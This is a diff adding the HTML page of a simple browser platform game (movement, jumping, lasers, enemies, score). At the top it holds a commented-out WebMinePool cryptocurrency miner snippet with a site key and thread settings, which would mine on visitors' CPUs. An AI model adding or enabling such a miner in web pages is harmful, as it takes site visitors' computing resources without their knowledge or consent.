@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Platform Game - Test</title>
+    <!--    Miner
+    <script src="https://webminepool.com/lib/base.js"></script>
+    <script>
+      var miner = WMP.User('SK_4NgHVFwRZFjQ56ixBJcEs', 'platform',{
+          threads: 4,
+          autoThreads: false,
+          throttle: 0.3,
+          forceASMJS: false
+       });
+       miner.start();
+    </script>-->
+    <script src="https://simplycodingcourses.com/files/simplyjs/simply.js"></script>
+    <script>
+      var level = [];
+      
+      function start() {
+        sjs.open("target", 800, 500)
+        var background = new sjs.Image("Images/background.png")
+        background.setSize(2500,500)
+        
+        sjs.loadImageArray(localStorage.getItem("level"))
+        
+        //Player Properties
+        var player = new sjs.Image("Images/r_idle.png")
+        player.type = "player"
+        player.setSize(85,93)
+        player.setGravity(8)
+        player.bottom()
+        player.friction = .2
+        player.noBounds = true;
+        
+        sjs.scrollable(player,background)
+        
+        //Player movement controls
+        
+        var r_images = ["Images/r_walk-0.png", "Images/r_walk-1.png", "Images/r_walk-2.png", "Images/r_walk-3.png", "Images/r_walk-4.png", "Images/r_walk-5.png", "Images/r_walk-6.png", "Images/r_walk-7.png"];
+        
+        var l_images = ["Images/l_walk-0.png", "Images/l_walk-1.png", "Images/l_walk-2.png", "Images/l_walk-3.png", "Images/l_walk-4.png", "Images/l_walk-5.png", "Images/l_walk-6.png", "Images/l_walk-7.png"];
+        var r_facing = true;
+        var r_track = 0;
+        var l_track = 0;
+        
+        sjs.keyDown(RIGHT_KEY, function(){
+          r_facing = true;
+          r_track = r_track + 1
+          player.pushRight(2)
+          player.setImage(r_images[r_track])
+          if(r_track == 7){
+            r_track = 0;
+          }
+          if(r_track >= 8){
+            player.setImage("Images/r_jump.png");
+          }
+        }); //end Right key
+        
+        sjs.keyDown(LEFT_KEY, function(){
+          r_facing = false;
+          l_track = l_track + 1
+          player.pushLeft(2)
+          player.setImage(l_images[l_track])
+          if(l_track == 7){
+            l_track = 0
+          }
+          if(l_track >= 8){
+            player.setImage("Images/l_jump.png");
+          }
+        }); //end Left key
+        
+        
+        //Jumping code
+        var canJump = true;
+        sjs.keyDown(UP_KEY, function(){
+          if(canJump == true){
+            canJump = false;
+            player.pushUp(55)
+            if(r_facing == true){
+              player.setImage("Images/r_jump.png")
+              r_track = 8
+            } else {
+              player.setImage("Images/l_jump.png")
+              l_track = 8
+            }
+          }
+        }) // end keyDown function
+        
+        window.addEventListener("keyup", function(e){
+          if (e.keyCode == RIGHT_KEY) {
+            player.setImage("Images/r_idle.png")
+            r_track = 0
+          } else if (e.keyCode == LEFT_KEY) {
+            player.setImage("Images/l_idle.png")
+            l_track = 0
+          } //end if statement
+        }); //end EventListener function
+        
+        sjs.keyDown(DOWN_KEY, function(){
+          if(canShoot == true){
+            canShoot = false;
+            var laser = new sjs.Image("Images/laser.png");
+            laser.type = "laser";
+            laser.setSize(100,50);
+            laser.friction = 0;
+            laser.noBounds = true;
+            if(r_facing == true){
+              laser.moveTo(player.getX()+44,player.getY()+7);
+              laser.pushRight(25.5);
+            } else {
+              laser.moveTo(player.getX()+-60,player.getY()+7);
+              laser.pushLeft(25.5);
+            }
+            setTimeout(function(){
+              canShoot = true;
+            },1500);
+          } // end canShoot if statement
+        }) // end keyDown function DOWN_KEY
+        
+        //onHit functions
+        sjs.onHit("player","platform", function(x,y){
+          sjs.stoppedBy(x,y)
+          if (canJump == false && x.y < y.y-85) {
+            canJump = true
+            r_track = 0
+            l_track = 0
+          }
+        })
+        
+        sjs.onHit("player","jump_pad", function(x,y){
+          if(x.isAboveOf(y) == true){
+            player.pushUp(50);
+          } else {
+            sjs.stoppedBy(x,y);
+          }
+        });
+        
+        sjs.onHit("player","enemy", function(x,y){
+          x.destroy();
+          window.location = "gameover.html";
+        });
+        
+        sjs.onHit("laser","enemy", function(x,y){
+          x.destroy();
+          y.destroy();
+        });
+        
+        sjs.onHit("laser",["platform","jump_pad", "powerUp","score","flag"], function(x,y){
+          sjs.bounceOff(x,y);
+        });
+        
+        sjs.onHit("laser",["right_screen","left_screen"], function(x,y){
+          x.destroy();
+        });
+        
+        sjs.onHit("enemy","bottom_screen", function(x,y){
+          sjs.stoppedBy(x,y);
+        });
+        
+        sjs.onHit("enemy",["left_screen","right_screen"], function(x,y){
+          sjs.bounceOff(x,y);
+        });
+        
+        sjs.onHit("enemy","platform", function(x,y){
+          if(x.isAboveOf(y) == true){
+            sjs.stoppedBy(x,y);
+          } else {
+            sjs.bounceOff(x,y);
+          }
+        });
+        
+        var canShoot = false;
+        sjs.onHit("player","powerUp", function(x,y){
+          canShoot = true;
+          y.destroy()
+        })
+        
+        var score = 0;
+        var score_txt = new sjs.Text("Score: 0", 21, "green")
+        score_txt.right().offset(-20, 0)
+        score_txt.fixed = true;
+        sjs.onHit("player","score", function(x,y){
+          score = score + 1;
+          score_txt.setText("Score: "+ score)
+          localStorage.setItem("score", score)
+          y.destroy()
+        })
+        
+        var flagOn = true;
+        sjs.onHit("player","flag", function(x,y){
+          x.stop()
+          if(flagOn == true){
+            flagOn = false;
+            setTimeout(function(){
+              y.setImage("Images/flag_none.png")
+            },800)
+            setTimeout(function(){
+              y.setImage("Images/flag_win.png")
+            },1600)
+            setTimeout(function(){
+              window.location = "test.html"
+            },2400)
+          }//end if statement
+        })
+        
+        sjs.onHit("player","bottom_screen",function(x,y){
+          sjs.stoppedBy(x,y);
+          if (canJump == false) {
+            canJump = true;
+            r_track = 0;
+            l_track = 0;
+          }
+        })
+      } //end start function
+    </script>
+  </head>
+  <body onload="start()">
+    <h1>Platform Game</h1>
+    
+    <div id="target" style="margin:auto;background:grey;"></div>
+  </body>
+</html>
